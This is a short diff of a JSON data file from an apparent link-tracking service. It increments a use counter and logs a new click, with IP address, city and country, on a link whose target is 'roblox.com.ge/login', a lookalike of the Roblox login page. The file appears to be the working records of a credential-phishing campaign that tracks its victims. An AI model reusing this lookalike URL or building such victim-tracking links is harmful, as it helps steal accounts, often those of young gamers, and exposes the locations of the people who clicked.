@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1037,
+    "useCount": 1038,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8416,6 +8416,14 @@
         "city": "Houston",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777233065156,
+        "ip": "201.20.124.86",
+        "country": "Brazil",
+        "city": "Fortaleza",
+        "flag": "🇧🇷",
+        "countryCode": "BR"
       }
     ]
   },
